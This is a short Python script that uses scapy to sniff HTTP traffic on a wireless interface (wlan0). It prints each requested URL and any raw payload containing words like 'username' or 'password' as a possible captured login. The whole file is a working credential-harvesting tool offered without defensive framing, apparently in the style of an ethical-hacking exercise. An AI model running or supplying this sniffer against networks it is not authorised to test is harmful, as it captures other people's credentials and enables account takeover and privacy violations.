#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packed)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["email","username", "login", "user", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                   return load

def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))
        login_info = get_login_info(packet)

        if login_info:
            print("\n\n[+] Possible user and password >> " + login_info + "\n\n")
        

sniffer("wlan0")